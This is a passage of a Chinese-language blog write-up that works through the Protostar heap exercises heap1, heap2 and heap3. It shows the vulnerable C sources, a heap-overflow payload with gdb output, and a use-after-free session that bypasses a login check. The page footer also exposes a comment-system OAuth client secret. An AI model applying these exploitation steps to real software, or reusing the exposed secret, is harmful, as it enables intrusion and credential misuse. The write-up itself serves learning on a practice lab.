&#x27;A&#x27;*20+&#x27;\x74\x97\x04\x08&#x27;+&#x27; &#x27;+&#x27;\x94\x84\x04\x08&#x27;&quot;</span>`</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y <span class="keyword">or</span> n) y</span><br><span class="line"></span><br><span class="line">Starting program: /opt/protostar/bin/heap1 `python -c <span class="string">&quot;print &#x27;A&#x27;*20+&#x27;\x74\x97\x04\x08&#x27;+&#x27; &#x27;+&#x27;\x94\x84\x04\x08&#x27;&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> we have a winner @ <span class="number">1606399177</span></span><br><span class="line"></span><br><span class="line">Program exited with code <span class="number">042.</span></span><br></pre></td></tr></table></figure>
+<p>改题目解法为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./heap1 `python -c <span class="string">&quot;print &#x27;A&#x27;*20+&#x27;\x74\x97\x04\x08&#x27;+&#x27; &#x27;+&#x27;\x94\x84\x04\x08&#x27;&quot;</span>`</span><br></pre></td></tr></table></figure>
+<h3 id="23-heap2"><a class="markdownIt-Anchor" href="#23-heap2"></a> 2.3 heap2</h3>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdlib.h&gt;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">auth</span> &#123;</span><br><span class="line">  <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">  <span class="type">int</span> auth;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">auth</span> *auth;</span><br><span class="line"><span class="type">char</span> *service;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> line[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[ auth = %p, service = %p ]\n&quot;</span>, auth, service);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fgets</span>(line, <span class="built_in">sizeof</span>(line), stdin) == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">&quot;auth &quot;</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      auth = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(auth));</span><br><span class="line">      <span class="built_in">memset</span>(auth, <span class="number">0</span>, <span class="built_in">sizeof</span>(auth));</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strlen</span>(line + <span class="number">5</span>) &lt; <span class="number">31</span>) &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(auth-&gt;name, line + <span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">&quot;reset&quot;</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(auth);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">&quot;service&quot;</span>, <span class="number">6</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      service = <span class="built_in">strdup</span>(line + <span class="number">7</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line, <span class="string">&quot;login&quot;</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(auth-&gt;auth) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;you have logged in already!\n&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please enter your password\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此题中根据用户输入的不同，选择执行不同分支。其中<code>auth</code>分支会分配堆，并设置值，<code>reset</code>会释放堆空间，<code>login</code>将根据<code>auth-&gt;auth</code>判断是否登录成功。</p>
+<p>思路：堆释放后无清零，可以通过UAF漏洞绕过校验。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ ./heap2</span><br><span class="line">[ auth = (nil), service = (nil) ]</span><br><span class="line">auth AAAA</span><br><span class="line">[ auth = 0x804c008, service = (nil) ]</span><br><span class="line">resset</span><br><span class="line">[ auth = 0x804c008, service = (nil) ]</span><br><span class="line">service</span><br><span class="line">[ auth = 0x804c008, service = 0x804c018 ]</span><br><span class="line">service AAAAAAAAA</span><br><span class="line">[ auth = 0x804c008, service = 0x804c028 ]</span><br><span class="line">login</span><br><span class="line">you have logged <span class="keyword">in</span> already!</span><br><span class="line">[ auth = 0x804c008, service = 0x804c028 ]</span><br></pre></td></tr></table></figure>
+<p>以上过程中，给<code>auth</code>分配的地址为<code>0x0804c008</code>,则<code>auth-&gt;auth</code>分配的地址为<code>0x0804c028</code>。虽然<code>reset</code>释放了<code>auth</code>，但在<code>login</code>中仍然使用地址为<code>0x0804c028</code>作为<code>auth-&gt;auth</code>进行判断。我们在<code>login</code>前调用两次<code>service</code>,即可将<code>0x0804c028</code>地址覆盖为非0，进而通过校验。</p>
+<h3 id="24-heap3"><a class="markdownIt-Anchor" href="#24-heap3"></a> 2.4 heap3</h3>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;that wasn&#x27;t too bad now, was it? @ %d\n&quot;</span>, <span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *a, *b, *c;</span><br><span class="line"></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;dynamite failed?\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本题利用 Doug Lea Malloc (dlmalloc) 算法改变程序执行流。为理解破解过程，我们需要了解该堆分配算法。</p>
+<h3 id="dl-loc分配算法"><a class="markdownIt-Anchor" href="#dl-loc分配算法"></a> dl-loc分配算法</h3>
+<p><a target="_blank" rel="noopener" href="http://phrack.org/issues/57/9.html">once upon a free</a><br>
+<a target="_blank" rel="noopener" href="http://phrack.org/issues/57/8.html#article">Vudo malloc tricks</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee/辣条</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/alipay.jpg" alt="ootyoo 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/hacking/" rel="tag"><i class="fa fa-tag"></i> hacking</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/11/25/vpn/" rel="prev" title="vpn搭建梯子教程">
+                  <i class="fa fa-chevron-left"></i> vpn搭建梯子教程
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/12/17/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E8%AE%BA%E6%96%87/" rel="next" title="如何阅读论文">
+                  如何阅读论文 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ootyoo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="400" alpha="0.7" zIndex="-3" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"ootyoo","repo":"blog-comment","client_id":"c8a190dfe3835b595b42","client_secret":"be0510f7873e76fc3fa0f9e4b6ff686fd6ef4a0e","admin_user":"ootyoo","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"def98af837ef1d3f07a4d3d611f1b8cd"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
